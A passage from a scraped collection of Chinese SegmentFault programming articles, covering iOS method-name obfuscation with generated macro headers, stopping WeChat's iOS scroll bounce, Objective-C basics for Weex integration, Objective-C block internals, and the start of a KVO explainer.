<code>-k</code>（ignore_key_dir）：可选，用于存放需要过滤的key(增加内容)</li>
<li>
<code>-o</code>（output_dir）：必须，输出文件的目录，用于输出关键字、日志以及最后生成的混淆头文件的目录</li>
</ul>
<ol><li>运行后会在你指定的输出目录下产生一份Confuse.h文件，内容一般如下：</li></ol>
<pre><code class=""c"">#ifndef NEED_CONFUSE_h
#define NEED_CONFUSE_h
// 生成时间： 2018-04-03 17:20:51
#define Function1 linotypistStonecrop
#define function1 exactingnessMimologist
#define function2 sheepmanSupersublimated
#define functionWithTitle kensititeCratinean
#define subTitle icelandicUntell
#endif</code></pre>
<p>这份文件包含了一堆的宏定义，将需要替换的方法名都替换为了一些随机的字符串，因为宏定义是全局替换，我们只需要将该文件引入到自己的项目中，并在PCH文件中进行引入即可。</p>
<p>引入该文件后，Command+B测试编译，如果无法避免而产生编译错误则需要手动调整；由于将所有的替换归集到了头文件中了，所以遇到有错误的地方尝试删除对应宏定义替换信息重新编辑即可。</p>
<p>另外附上一个系统系统库路径：</p>
<blockquote>/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk/System/Library/Frameworks</blockquote>
<hr>
<h2>图文教程</h2>
<p>了解完原理，接下来用图文来详细介绍使用方法：<br>首先去我的<a href=""https://github.com/TMWu/TMConfuse"" rel=""nofollow noreferrer"">Github</a>上获取下源代码资源文件。</p>
<blockquote>注：关键文件如下:</blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014176781"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<ul>
<li>
<code>Confuse.h</code>最终生成的替换文件就是这个了，该文件里记录了所有需要混淆的方法名和与之对应的替换字符串</li>
<li>
<code>Confuse.py</code>该文件是脚本内容所在，所有实现方法都在这。</li>
<li>
<code>ignoreKey.txt</code>该文件下记录需要过滤的特殊key，每个key换行读取</li>
<li>
<code>start.sh</code>开始执行脚本 ，在此脚本内更改路径</li>
</ul>
<h3>现在开始集成：</h3>
<p>首先需要一个pch文件，至于pch的用法自行百度吧.。</p>
<pre><code>#ifndef TMPrefixHeader_pch
#define TMPrefixHeader_pch
//代码混淆关键导入文件头，注释后不混淆
#import ""Confuse.h""
#endif /* TMPrefixHeader_pch */</code></pre>
<p>根据自行需求添加特殊<code>key</code>到<code>ignoreKey.txt</code>文件内<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014167405"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>通过<code>start.sh</code>脚本快速执行<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014167406"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>终端执行内容大概如下：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014167407"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>生成的混淆文件：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014167408"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>编译结果：对无参数、无返回值、多参数等方法名完成识别替换。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014167409"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>接下来我们用<a href=""https://cnbin.github.io/blog/2015/05/21/objective-c-class-dump-an-zhuang-he-shi-yong-fang-fa/"" rel=""nofollow noreferrer""><code>class-dump</code></a>来反编译一下：</p>
<blockquote>class-dump -H /Users/wuaming/Library/Developer/Xcode/DerivedData/TMConfuse-becmpkjuhzbzfldtqwaiznqcmmxq/Build/Products/Debug-iphonesimulator/TMConfuse.app -o /Users/wuaming/Desktop/heads</blockquote>
<p>对比结果：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014176782"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h4>附上个人Github：<a href=""https://github.com/TMWu/TMConfuse"" rel=""nofollow noreferrer"">https://github.com/TMWu/TMCon...</a>
</h4>
<h4>简书：<a href=""https://www.jianshu.com/p/c9073d1e06b9"" rel=""nofollow noreferrer"">https://www.jianshu.com/p/c90...</a>
</h4>
<p>最后还是要感谢下几位大佬！<br>相关链接：<br><a href=""https://cnbin.github.io/blog/2015/05/21/objective-c-class-dump-an-zhuang-he-shi-yong-fang-fa/"" rel=""nofollow noreferrer"">Objective-C Class-dump 安装和使用方法(原创)</a><br><a href=""https://blog.csdn.net/yiyaaixuexi/article/details/29201699"" rel=""nofollow noreferrer"">iOS安全攻防（二十三）：Objective-C代码混淆</a><br><a href=""https://github.com/kaich/codeobscure"" rel=""nofollow noreferrer"">感谢原作者的Github</a></p>

                ", iOS开发系列--代码混淆,1531971877,598,1,493,1,1,https://segmentfault.com/a/1190000014167401
18,1,0,6,"
                    
<p>在升级到 ios11.3 系统后，发现之前阻止页面滚动的代码e.preventDefault代码失效了。于是自己折腾了一番，找到了解决办法，分享给大家。</p>
<h1>一、前言</h1>
<p>浏览器在移动端有一个默认触摸滚动的效果，让我们感触最深的莫过于微信浏览器里面，下拉时自带橡皮筋的效果。</p>
<p>然而在开发的时候我们经常需要阻止此效果。</p>
<p>在此先直接给一个方案，直接加上下面的代码即可：</p>
<pre><code>document.body.addEventListener('touchmove', function (e) {
  e.preventDefault(); //阻止默认的处理方式(阻止下拉滑动的效果)
}, {passive: false}); //passive 参数不能省略，用来兼容ios和android</code></pre>
<p>如果不加<code>passive:false</code>,在 ios 上是不能起作用的。</p>
<h1>二、解释</h1>
<p>微信在 Android 端和 IOS 端使用的不是同样的浏览器内核：</p>
<ul>
<li>Android 版 微信浏览器 ：QQ浏览器 X5内核（相当于使用的 Chrome）</li>
<li>IOS 版 微信浏览器 ：WKWebView（相当于使用的Safari）</li>
</ul>
<p>所以下面分别使用 Chrome 和 Safari 来分析。</p>
<blockquote>关于浏览器内核问题，有兴趣的可以看看这个：<a href=""https://www.cnblogs.com/jesse131/p/4888857.html"" rel=""nofollow noreferrer"">浏览器内核总结</a>
</blockquote>
<h2>1. Chrome 默认的事件监听参数：</h2>
<p><span class=""img-wrap""><img data-src=""/img/bV7smC?w=180&amp;h=104"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><code>useCapture:false</code> 表示事件采用冒泡机制（capture 译为 捕获），浏览器默认就是false；<br><code>passive:false</code> 表示我现在主动告诉浏览器该监听器将使用<code>e.preventDefault()</code>来阻止浏览器默认的滚动行为（可以提高运行速度）。</p>
<h2>2. Safari 默认的事件监听参数：</h2>
<p>在 Safari 中，有一个<a href=""https://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_11_1.html"" rel=""nofollow noreferrer"">更新</a>：</p>
<blockquote>Updated root document touch event listeners to use passive mode improving scrolling performance and reducing crashes<br>更新了根文档触摸事件侦听器，默认使用<code>passive:true</code>提高滚动性能并减少崩溃</blockquote>
<p>所以Safari 中默认使用了<code>passive:true</code>，告诉浏览器，此监听事件中，不会阻止默认的页面滚动。这将导致设置的<code>e.preventDefault()</code>代码失效。</p>
<p>所以 Safari 默认是不会阻止滚动的。</p>
<h2>3. 结论</h2>
<p>我们通过 e.preventDefault(); 阻止默认的下拉滑动的效果，通过添加 passive:false 参数来兼容各个浏览器。即可实现阻止移动页面滚动的功能。</p>
<h1>三、关于 passive 参数</h1>
<p>关于 passive 在事件监听中的作用，推荐大家看这篇文章：<a href=""https://www.cnblogs.com/ziyunfei/p/5545439.html"" rel=""nofollow noreferrer"">passive 的事件监听器</a></p>

                ", 阻止微信浏览器下拉滑动效果（ios11.3 橡皮筋效果）,1531971878,134,1,195,1,1,https://segmentfault.com/a/1190000014134234
19,1,0,6,"
                    
<h2>背景</h2>
<p>最近要把<code>weex</code>集成到App中，需要给<code>iOS</code>和<code>安卓</code>提供库文件，这里的库文件并不是<code>WeexSDK</code>，而是连接<code>iOS</code>和<code>Weex</code>的中间件，所以就接触到<code>oc</code>，如果你也和我一样，需要集成<code>weex</code>，那恭喜你，<code>oc</code>你也需要学习。你可能会有个疑问，不是有专职的<code>iOS</code>工程师嘛，干嘛还需要前端来写，我是这么想的：</p>
<ul>
<li>首先你是<code>weex</code>的发起者，同时你也是推动者，App要集成这项目技术，iOS工程师当然希望集成越简单，对现有功能影响越小越好，那自然不能把<code>weex</code>和他们的代码混到一起，那这块相对独立的功能自然是前端来做最合适</li>
<li>其次这是了解全面了解<code>iOS</code>的一次绝佳的机会，爱学习的你，真的愿意拱手相让么？</li>
<li>以后三端的界限会变的不那么清晰了，现在都在提大前端，多接触其他领域也是件好事</li>
</ul>
<h2>前面的话</h2>
<p>既然我们是做前端的，对一门新语言只要大致知道语法还有这门语言的特点（这块会着重介绍），不过三天，你会写的js一样熟练，好，我们开始我们的第一个<code>Hello World！</code></p>
<h2>开始第一个程序</h2>
<p>我们先使用<code>xcode</code>来开发入门的<code>IDE</code>。新建项目的时候，我们需要注意一下，既然是入门语法（不涉及画UI），我们没有必要搞那么复杂，就选择最简单的类型：命令行。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV658x?w=726&amp;h=233"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>运行结果：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV66nw?w=596&amp;h=50"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>新建完成之后，我们就能看到<code>main.m</code>文件，使用<code>cmd+R</code>来运行，就可以在命令行看到效果，下面我们来依次介绍语法，保证简洁！</p>
<h2>基本类型</h2>
<ul>
<li>
<code>int</code>类型没啥好说的，就这样定义就行：<code>int a = 10;</code>
</li>
<li>
<code>string</code>类型比较特殊，字符串属性<strong>对象类型</strong>，所以我们定义时，在字符串前面需要加一个<code>@</code>，变量名称前加<code>*</code>，这样定义：<code>NSString *name = @""james"";</code>其中<code>NSString</code>就代表字符串类型。</li>
</ul>
<h2>占位符</h2>
<p>占位符应用比较多的场景是<code>NSLog</code>，也就是我们js的<code>console.log</code>，打印变量是我们开发中常用到的功能，<code>oc</code>中我们使用占位符来代表变量，比如我们要打印<code>int age = 10; NSString *name = @""james"";</code>，我们可以这样做：</p>
<pre><code>NSLog(@""姓名：%@，年龄：%d"", name, age);</code></pre>
<p>其中：<code>%@</code>代表对象类型的占位符；<code>%d</code>代表整型的占位符。</p>
<h2>方法</h2>
<h3>单参数/无参数方法</h3>
<p>在<code>oc</code>中，方法的定义比较特殊，差不多长这样：</p>
<pre><code>+ (void) test {
    NSLog(@""Hello World!"");
}

- (NSString *) test1:(NSString *)key {
    return key;
}</code></pre>
<p>这里面你发现没有<code>function</code>这样的关健字，</p>
<ul>
<li>
<code>+</code>号代表<strong>静态方法</strong>，<code>-</code>号代表<strong>实例方法</strong>（需要实例化后才能使用）</li>
<li>括号里面代表返回值，<code>void</code>代表无返回</li>
<li>
<code>test</code>和<code>test1</code>代表方法名称</li>
<li>
<code>(NSString *) key</code>代表参数类型和参数变量名</li>
</ul>
<h3>多参数方法</h3>
<p>多参数的方法，在这里要好好的说一下，初始接触oc，你肯定会觉得莫名其妙，我们先来看下多参数方法的定义：</p>
<pre><code>-(void)login:(NSString *)userName password:(NSString *)pwd {
    NSLog(@""userName=%@, password=%@"", userName, pwd);
}</code></pre>
<p>看起来是不是有点蒙，这和我们之前任何一种语言方法的定义都不一样，现在我们一张图就能说明白，看懂了之后，习惯就好了</p>
<p><span class=""img-wrap""><img data-src=""/img/bV65eK?w=610&amp;h=192"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>类的介绍</h2>
<p>任何面对对象的语言都有类，oc也不例外，新建类的时候，我们选择：<code>macOS</code>--&gt;<code>Cocoa Class</code>，这样在项目中，你会发现两个文件，一个<code>*.h</code>文件和<code>*.m</code>文件，下面我们分别介绍</p>
<h3>
<code>*.h</code>文件的作用</h3>
<pre><code>#import &lt;Foundation/Foundation.h&gt;
@interface Test : NSObject
-(void) test;
@end</code></pre>
<p>这里面只定义<strong>需要外部访问的方法结构</strong>，也就是对外的方法，具体实现是在<code>.m</code>文件中</p>
<h3>类的使用</h3>
<p>类的使用，也和其他语言不太一样，我们先来看一张图</p>
<p><span class=""img-wrap""><img data-src=""/img/bV65kI?w=528&amp;h=240"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<ul>
<li>类的实例化需要两步：<code>alloc</code>分配内存，<code>init</code>才是实例化，在其他语言中<code>new</code>其实执行的也是这两步</li>
<li>类对方法的调用使用的是<code>[对象 方法]</code>这种形式，而不是以<code>对象.方法</code>的形式，这和其他语言区别比较大</li>
<li>点的方式也用的到，就是<strong>获取对象属性</strong>的时候，就是使用这种形式<code>对象.属性</code>
</li>
</ul>
<h2>代码块（block）</h2>
<p>代码块这个词你乍一听挺陌生，我举一个我们js里面经常用的例子，你就明白了。</p>
<pre><code>function add(age, cb) {
    age += 1
    cb(age)
}

add(20, function(newAge){
    console.log(newAge)
})</code></pre>
<p>oc里面的代码码对应的就是<code>add</code>方法中的cb，js是因为是弱类型语言，所以不需要定义类型，但是oc是强类型的，要用就必须定义，那cb是啥类型呢，就是代码块类型！其实这种类型<strong>解决的一个主要问题就是异步回调</strong>，和我们js里面的用法差不多，我们看下oc里面怎么使用</p>
<pre><code>// 定义一个block
typedef void(^callbackBlock)(NSString *data);
// 定义方法
+ (void)ajax:(NSString *)url cb:(callbackBlock)aCallback {
    ......
    aCallback(@""Hello"")
    ......
}
// 使用方法
[YourClass ajax:@""xxxx"", cb:^(NSString *data){
    NSLog(data);
}]</code></pre>
<h2>协议（Protocol）</h2>
<p>oc里面的协议（Protocol）和java里面的接口（interface）比较类似，都是只定义，不实现；都需要一个类来实现这个协议和协议里面的方法。我们来看下语法：</p>
<ul><li>定义协议</li></ul>
<pre><code>#import &lt;Foundation/Foundation.h&gt;
// @protocol为关健字，定义这个类是一个协议类
@protocol TestProtocol &lt;NSObject&gt;

// @required为关健字，代表必须要实现的方法
@required
- (void)req;

// @required为关健字，代表未必要实现的方法
@optional
- (void)opt;
@end</code></pre>
<ul><li>引入协议：<code>Test.h</code>文件</li></ul>
<pre><code>#import &lt;Foundation/Foundation.h&gt;
// 引入协议类
#import ""TestProtocol.m""
// NSObject&lt;TestProtocol&gt;让Test类知道必须实现协议的方法
@interface Test : NSObject&lt;TestProtocol&gt;
// 注：这里面不用定义协议类的方法，需要在.m文件中定义和实现
@end</code></pre>
<ul><li>实现协议：<code>Test.m</code>文件</li></ul>
<pre><code>#import ""Test.h""
@implementation Test
-(void)req {
    NSLog(@""实现协议方法"");
}
// 注：就算是@required方法，类中不实现依然不会报错，编译也能通过，只是给个警告
@end</code></pre>
<p>看完了你可能会觉得这玩意有啥用啊，其实协议的用途<strong>主要是在运行时（runtime）</strong>，尤其是<code>weex</code>和已有项目集成时，如果没有这个东西，根本就集成不起来，这块内容我们后面会说。</p>
<h2>
<code>json</code>对象与<code>oc</code>
</h2>
<p><code>oc</code>中存储<code>json</code>对象的类型是：<code>NSDictionary</code>，我们来看下我们前端经常使用的一些<code>json</code>方法</p>
<ul><li>字符串转<code>json</code>
</li></ul>
<pre><code>NSString *jsonString = @""{\""id\"":1}"";
// 先转成NSData类型
NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
// 再转成NSDictionary
NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:nil];
// 根据key获取value
NSLog(@""%@"",dic[@""id""]);</code></pre>
<ul><li>
<code>json</code>对象循环</li></ul>
<pre><code>for (NSString *key in dic) {
    NSLog(@""key=%@, value=%@"", key, dic[key]);
}</code></pre>
<h2>结语</h2>
<p>其实这篇文章并不没有教你在oc中for循环怎么写，if/else怎么写，因为你写过js，这些根本就不用教，自然就会，我写的都是<code>oc</code>这门语言，我在使用过程中，和<code>javascript</code>以及<code>java</code>中，需要注意的地方，同时我也没有说UI方面的东西，比如按钮怎么写、怎么设置背景颜色...原因有两个：</p>
<ul>
<li>这里面主要针对<code>weex</code>集成到App中提供的公共服务，根本就涉及不到UI</li>
<li>如果上面的东西熟练了，UI其实就是类调用方法，没啥特殊的地方，哪里不会Google哪里就好</li>
</ul>
<p>在集成<code>weex</code>的时候，需要写大量的<code>oc</code>逻辑代码，这部分功能就是我们提供给现有的App的一个<code>pod</code>（类似npm包），里面包括：缓存js文件、读取js文件、写<code>weex</code>的扩展module、把业务类注入到<code>pod</code>中使用、调试中使用到的<code>websocket</code>...所以当你在实现的过程中，你自然就熟悉了这门语言。<strong>多写才是掌握OC的唯五捷径！</strong></p>

                ", 前端集成weex，你需要学习的objective-c基础,1531971880,550,1,864,1,1,https://segmentfault.com/a/1190000014046951
20,1,0,6,"
                    
<h2>前言</h2>
<p>在Objective-C中，block是一个很常见的东西，说白了就是个匿名函数，网上有很多关于block如何使用的文章，讲的都非常精彩，这里主要探讨下block的实现原理。关于如何使用block，请参考网上的教程。</p>
<h2>实例</h2>
<p>先来新建一个控制台工程，main.m里的代码如下，并思考下最后的输出结果是什么：</p>
<pre><code class=""objc"">void blockFunc1() {
    int num = 100;
    void (^block)(void) = ^() {
        NSLog(@""num = %d\n"", num);
    };
    num = 200;
    block();
}

void blockFunc2() {
    __block int num = 100;
    void (^block)(void) = ^() {
        NSLog(@""num = %d\n"", num);
    };
    num = 200;
    block();
}

int num = 100;
void blockFunc3() {
    void (^block)(void) = ^() {
        NSLog(@""num = %d\n"", num);
    };
    num = 200;
    block();
}

void blockFunc4()
{
    static int num = 100;
    void (^block)(void) = ^{
        NSLog(@""num = %d"", num);
    };
    num = 200;
    block();
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        
        ^{ printf(""Hello, World!\n""); } ();
        
        blockFunc1();
        blockFunc2();
        
        blockFunc3();
        blockFunc4();
    }
    return 0;
}</code></pre>
<p>打印结果是：</p>
<pre><code>Hello, World!
2018-03-21 15:50:01.996591+0800 BlockDemo[34825:4848536] num = 100
2018-03-21 15:50:01.997009+0800 BlockDemo[34825:4848536] num = 200
2018-03-21 15:50:01.997025+0800 BlockDemo[34825:4848536] num = 200
2018-03-21 15:50:01.997037+0800 BlockDemo[34825:4848536] num = 200</code></pre>
<p>聪明的读者应该早就知道这个结果，?，先简单解释一下:<br>1、<code>^{ printf(""Hello, World!\n""); } ();</code><br>这个没啥好说的，肯定就打印“Hello, World!”了。</p>
<p>2、<code>blockFunc1</code>里面,<code>num</code>是以值传递的方式被block获取，所以尽管后面更改了<code>num</code>的值，但是在block里面还是保持保持原来的值。</p>
<p>2、<code>blockFunc2</code>里面，num由<code>__block</code>修饰，<code>num</code>在block变成了外部的一个引用（后面会通过源码解释），所以在block外部改变<code>num</code>的值时，block里面的<code>num</code>也随着改变。</p>
<p>3、<code>blockFunc3</code>里面，block引用的是一个全局的num，所以，num改变的时候也会改变block内部num的值。</p>
<p>4、<code>blockFunc3</code>里面，block引用的是一个static的num，所以，num改变也会改变block内部的num的值。</p>
<h2>源码分析</h2>
<p>也许大家看到上面的解释还是不知道为啥会这样，所以接下，我通过源码来分析下其中的缘由，我们先把这段先转换成c++文件，cd到main.m所在的目录，并执行这条命令<code>clang -rewrite-objc main.m</code>，通过这条命令可以把main.m文件转换成cpp文件，里面可以看到block的结构。我们打开这份文件，这个文件比较长，直接拉到最后。可以看到在文件的最后是main函数的入口，代码如下：</p>
<pre><code>int main(int argc, const char * argv[]) {
    /* @autoreleasepool */ { __AtAutoreleasePool __autoreleasepool; 

        ((void (*)())&amp;__main_block_impl_0((void *)__main_block_func_0, &amp;__main_block_desc_0_DATA)) ();

        blockFunc1();
        blockFunc2();

        blockFunc3();
        blockFunc4();
    }
    return 0;
}</code></pre>
<p>先看第一行代码，构造了一个__main_block_impl_0对象，__main_block_impl_0是一个结构体。相关代码如下：</p>
<pre><code>struct __block_impl {
  void *isa;
  int Flags;
  int Reserved;
  void *FuncPtr;
};

struct __main_block_impl_0 {
  struct __block_impl impl;
  struct __main_block_desc_0* Desc;
  __main_block_impl_0(void *fp, struct __main_block_desc_0 *desc, int flags=0) {
    impl.isa = &amp;_NSConcreteStackBlock;
    impl.Flags = flags;
    impl.FuncPtr = fp;
    Desc = desc;
  }
};</code></pre>
<p>从代码可知，最后block会转化成一个__block_impl对象，而block执行的代码会转化成一个静态函数，__block_impl里面的FuncPtr会指向这个静态函数。在这里<code>printf(""Hello, World!\n"");</code>这个block转换后的静态函数如下：</p>
<pre><code>static void __main_block_func_0(struct __main_block_impl_0 *__cself) {
 printf(""Hello, World!\n""); 
}</code></pre>
<p>所以整个过程是这样的：<br>1、先构造一个<code>__main_block_impl_0</code>对象，构造的时候把<code>__main_block_func_0</code>传进去，当然还有别的参数，这里先不考虑。</p>
<p>2、在<code>__main_block_impl_0</code>的构造方法中，再把<code>__main_block_func_0</code>赋给<code>__block_impl</code>的FuncPtr。</p>
<p>3、调用FuncPtr。</p>
<p>所以，从上面可以看出，block实际上是转化为了一个<code>__block_impl</code>对象，这个对象有isa指针，用来表示block的类型，上面的block的isa指向&amp;_NSConcreteStackBlock。同时block对象还有一个FuncPtr指针，用来指向block执行的方法（转换后的静态函数）。</p>
<p>再来看看blockFunc1相关的内容</p>
<pre><code>struct __blockFunc1_block_impl_0 {
  struct __block_impl impl;
  struct __blockFunc1_block_desc_0* Desc;
  int num;
  __blockFunc1_block_impl_0(void *fp, struct __blockFunc1_block_desc_0 *desc, int _num, int flags=0) : num(_num) {
    impl.isa = &amp;_NSConcreteStackBlock;
    impl.Flags = flags;
    impl.FuncPtr = fp;
    Desc = desc;
  }
};

static void __blockFunc1_block_func_0(struct __blockFunc1_block_impl_0 *__cself) {
  int num = __cself-&gt;num; // bound by copy

        NSLog((NSString *)&amp;__NSConstantStringImpl__var_folders_rv_338km0ws0gb2gk132_zrs0wc0000gp_T_main_b5d67f_mi_0, num);
}
    
void blockFunc1() {
    int num = 100;
    void (*block)(void) = ((void (*)())&amp;__blockFunc1_block_impl_0((void *)__blockFunc1_block_func_0, &amp;__blockFunc1_block_desc_0_DATA, num));
    num = 200;
    ((void (*)(__block_impl *))((__block_impl *)block)-&gt;FuncPtr)((__block_impl *)block);
}</code></pre>
<p>在这个函数里面，构造block的时候把num传了进去，而且是普通值传递，这样的话其实是拷贝了一份num。然后在执行block方法的时候，使用的是拷贝的那份num，从<code>int num = __cself-&gt;num; // bound by copy</code>可以看出。这个block也是_NSConcreteStackBlock类型的。</p>
<p>再来看看__block修饰过的num在block里面是怎么传递的，我们看看blockFunc2相关的代码：</p>
<pre><code>// 封装num的结构
struct __Block_byref_num_0 {
  void *__isa;
__Block_byref_num_0 *__forwarding;
 int __flags;
 int __size;
 int num;
};

struct __blockFunc2_block_impl_0 {
  struct __block_impl impl;
  struct __blockFunc2_block_desc_0* Desc;
  __Block_byref_num_0 *num; // by ref
  __blockFunc2_block_impl_0(void *fp, struct __blockFunc2_block_desc_0 *desc, __Block_byref_num_0 *_num, int flags=0) : num(_num-&gt;__forwarding) {
    impl.isa = &amp;_NSConcreteStackBlock;
    impl.Flags = flags;
    impl.FuncPtr = fp;
    Desc = desc;
  }
};

static void __blockFunc2_block_func_0(struct __blockFunc2_block_impl_0 *__cself) {
    __Block_byref_num_0 *num = __cself-&gt;num; // bound by ref
    NSLog((NSString *)&amp;__NSConstantStringImpl__var_folders_rv_338km0ws0gb2gk132_zrs0wc0000gp_T_main_b5d67f_mi_1, (num-&gt;__forwarding-&gt;num));
}
    
void blockFunc2() {
    __attribute__((__blocks__(byref))) __Block_byref_num_0 num = {(void*)0,(__Block_byref_num_0 *)&amp;num, 0, sizeof(__Block_byref_num_0), 100};
    void (*block)(void) = ((void (*)())&amp;__blockFunc2_block_impl_0((void *)__blockFunc2_block_func_0, &amp;__blockFunc2_block_desc_0_DATA, (__Block_byref_num_0 *)&amp;num, 570425344));
    (num.__forwarding-&gt;num) = 200;
    ((void (*)(__block_impl *))((__block_impl *)block)-&gt;FuncPtr)((__block_impl *)block);
}</code></pre>
<p>从代码中可以看到，__block修饰的num在内部被包装成一个__Block_byref_num_0的对象，假设叫a，原来num的值100存储在对象a的num字段中，同时这个对象a有一个__forwarding字段，指向a本身。当改变num的值的时候（源代码是<code>num = 200;</code>），这段代码变为<code>(num.__forwarding-&gt;num) = 200;</code>，也就是说把对象a里面的num字段的值变为了200。同时，在block的执行函数__blockFunc2_block_func_0中，打印出来的取值是从<code>__Block_byref_num_0 *num = __cself-&gt;num;</code>取出，也就是取得是改变后的值，所以打印结果是200。这就是为什么用__block修饰的变量可以在block内部被修改。</p>
<p>那当num为全局变量的时候，block又是怎样的呢？请看代码：</p>
<pre><code>static void __blockFunc3_block_func_0(struct __blockFunc3_block_impl_0 *__cself) {

        NSLog((NSString *)&amp;__NSConstantStringImpl__var_folders_rv_338km0ws0gb2gk132_zrs0wc0000gp_T_main_b5d67f_mi_2, num);
    }
    
void blockFunc3() {
    void (*block)(void) = ((void (*)())&amp;__blockFunc3_block_impl_0((void *)__blockFunc3_block_func_0, &amp;__blockFunc3_block_desc_0_DATA));
    num = 200;
    ((void (*)(__block_impl *))((__block_impl *)block)-&gt;FuncPtr)((__block_impl *)block);
}</code></pre>
<p>从代码里可以看出，这种情况很简单，block对象根本没有num字段，也就是打印的时候直接取得全局的num。</p>
<p>最后一种情况也很简单，当num时static的时候，构造block对象的时候直接用引用传值的方式把num放到block对象中。所以，当外部改变num的值的时候，也能反映到block内部。代码如下：</p>
<pre><code>void blockFunc4()
{
    static int num = 100;
    void (*block)(void) = ((void (*)())&amp;__blockFunc4_block_impl_0((void *)__blockFunc4_block_func_0, &amp;__blockFunc4_block_desc_0_DATA, &amp;num));
    num = 200;
    ((void (*)(__block_impl *))((__block_impl *)block)-&gt;FuncPtr)((__block_impl *)block);
}</code></pre>
<h2>总结</h2>
<p>这篇文章主要从源码的角度讲述了block的实现机制，并针对四种情况分析了block是如何引用外部变量的，分别是:<br>1、当引用局部变量的时候，如果没有__block修饰，那么在block内部获取的是外部变量的一份拷贝，改变外部变量不影响block内部的那份拷贝。</p>
<p>2、当引用局部变量的时候，同时局部变量用__block修饰，那么在block内部使用的实际上是外部变量的一个引用，所以改变外部变量会影响block内部变量的值。</p>
<p>3、当引用全局变量的时候，block并不持有这个变量。</p>
<p>4、当引用static变量的时候，block会以引用的方式持有这个变量。当在外部修改这个变量的时候，会影响block内部持有的这个变量的值。</p>

                ", Objective-C block 实现机制,1531971882,559,1,565,1,1,https://segmentfault.com/a/1190000013920492
21,1,0,6,"
                    
<h5>该文章属于&lt;简书 — 刘小壮&gt;原创，转载请注明：</h5>
<p><a href=""https://www.jianshu.com/p/badf5cac0130"" rel=""nofollow noreferrer"">&lt;简书 — 刘小壮&gt; https://www.jianshu.com/p/badf5cac0130</a></p>
<hr>
<blockquote>我们在工作中经常会用到<code>KVO</code>，但是系统原生的<code>KVO</code>并不好用，很容易导致<code>Crash</code>。而且编写代码时，需要编写大量<code>KVO</code>相关的代码，由于不支持<code>block</code>的形式，代码会写的很分散。<p>本篇文章对<code>KVO</code>的实现原理进行了详细的分析，并且简单的实现了一个<code>KVO</code>，来当做技术交流。由于系统提供的<code>KVO</code>存在很多问题，在文章的最下面给出了解决方案。</p>
</blockquote>
<hr>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013813648"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""博客配图"" title=""博客配图""></span></p>
<h3>概述</h3>
<p><code>KVO</code>全称<code>KeyValueObserving</code>，是苹果提供的一套事件通知机制。允许对象监听另一个对象特定属性的改变，并在改变时接收到事件。由于<code>KVO</code>的实现机制，所以对属性才会发生作用，一般继承自<code>NSObject</code>的对象都默认支持<code>KVO</code>。</p>
<p><code>KVO</code>和<code>NSNotificationCenter</code>都是<code>iOS</code>中观察者模式的一种实现。区别在于，相对于被观察者和观察者之间的关系，<code>KVO</code>是一对一的，而一对多的。<code>KVO</code>对被监听对象无侵入性，不需要修改其内部代码即可实现监听。</p>
<p><code>KVO</code>可以监听单个属性的变化，也可以监听集合对象的变化。通过<code>KVC</code>的<code>mutableArrayValueForKey:</code>等方法获得代理对象，当代理对象的内部对象发生改变时，会回调<code>KVO</code>监听的方法。集合对象包含<code>NSArray</code>和<code>NSSet</code>。</p>
<h3>基础使用</h3>
<p>使用<code>KVO</code>分为三个步骤：</p>
<ol>
<li>通过<code>addObserver:forKeyPath:options:context:</code>方法注册观察者，观察者可以接收<code>keyPath</code>属性的变化事件。</li>
<li>在观察者中实现<code>observeValueForKeyPath:ofObject:change:context:</code>方法，当<code>keyPath</code>属性发生改变后，<code>KVO</code>会回调这个方法来通知观察者。</li>
<li>当观察者不需要监听时，可以调用<code>removeObserver:forKeyPath:</code>方法将<code>KVO</code>移除。需要注意的是，调用<code>removeObserver</code>需要在观察者消失之前，否则会导致<code>Crash</code>。</li>
</ol>
<h4>注册方法</h4>
<p>在注册观察者时，可以传入<code>options</code>参数，参数是一个枚举类型。如果传入<code>NSKeyValueObservingOptionNew</code>和<code>NSKeyValueObservingOptionOld</code>表示接收新值和旧值，默认为只接收新值。如果想在注册观察者后，立即接收一次回调，则可以加入<code>NSKeyValueObservingOptionInitial</code>枚举。</p>
<p>还可以通过方法<code>context</code>传入任意类型的对象，在接收消息回调的代码中可以接收到这个对象，是KVO中的一种传值方式。</p>
